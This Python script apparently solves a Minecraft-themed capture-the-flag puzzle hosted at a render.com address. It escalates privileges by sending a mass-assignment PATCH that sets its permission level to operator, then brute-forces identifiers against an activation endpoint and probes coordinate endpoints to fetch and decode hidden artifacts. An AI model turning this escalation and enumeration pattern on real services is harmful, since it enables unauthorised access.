#!/usr/bin/env python3
import requests, json, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

# Step 1: Elevate
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)
print('[1] Elevated to Operator')

# Step 2: Nether loot table
r = s.get(BASE + '/loot/fortress_84', timeout=15)
print(f'\n[2] /loot/fortress_84 [{r.status_code}]:')
print(json.dumps(r.json(), indent=2) if r.headers.get('content-type','').startswith('application/json') else r.text[:500])

# Step 3: Stronghold activation - try various identifiers
print('\n[3] Trying stronghold activations...')
identifiers = [
    'Chunk_0x84', 'ancient_city', 'Fragment_C',
    'fortress_84', 'loot_fortress_84', 'fortress',
    'stronghold', 'portal', 'ender_eye',
    '84', 'c', 'C', 'chunk_84',
    'BlockForge_SMP_S4', 'Steve',
    '8455c20f1aae92ea7e1e327de6b79f15',  # md5 of something?
]

eye_token = None
for ident in identifiers:
    r = s.post(BASE + '/api/stronghold/activate',
               json={'identifier': ident},
               timeout=15)
    data = r.json()
    if data.get('enderEyeToken') or data.get('status') == 'ok':
        print(f'  SUCCESS ({ident}): {json.dumps(data)[:400]}')
        eye_token = data.get('enderEyeToken')
        if eye_token:
            break
    elif 'error' not in data or data.get('error') != 'Not Found':
        print(f'  [{r.status_code}] ({ident}): {json.dumps(data)[:200]}')

if eye_token:
    print(f'\n[3] Ender Eye Token: {eye_token}')

# Step 4: Deep dark with various coords + the eye token
print('\n[4] Deep Dark scanning...')
# Fragment_C = 84 (first layer, Sub-Bedrock)
# Overworld rift: 10720, -2040
# Nether: 1340, -255
# Chunk coords (divide block coords by 16): 10720/16=670, -2040/16=-127.5~-128

chunk_coords = [
    (84, -84),       # direct chunk 0x84 = 132 decimal, but 0x84 = 132
    (0x84, 0),       # 0x84 = 132
    (132, 0),
    (84, 0),
    (670, -128),     # overworld rift / 16
    (1340, -255),    # nether coords
    (84, -64),
    (0, 84),
]

for x, z in chunk_coords:
    headers = {'X-Ender-Eye': eye_token} if eye_token else {}
    r = s.get(BASE + f'/api/deepdark/chunk/{x}/{z}', headers=headers, timeout=15)
    print(f'  deepdark ({x},{z}) [{r.status_code}]: ', end='')
    try:
        data = r.json()
        print(json.dumps(data)[:300])
        if data.get('artifact_endpoint'):
            print(f'  *** ARTIFACT: {data["artifact_endpoint"]} ***')
            r2 = s.get(BASE + data['artifact_endpoint'],
                       headers=headers,
                       timeout=15)
            print(f'  Artifact [{r2.status_code}]:')
            art = r2.json()
            print(json.dumps(art, indent=2))
            if art.get('encoding') == 'base64' and art.get('data'):
                decoded = base64.b64decode(art['data']).decode('utf-8', errors='replace')
                print(f'  BASE64 DECODED: {decoded}')
    except Exception as e:
        print(r.text[:200])
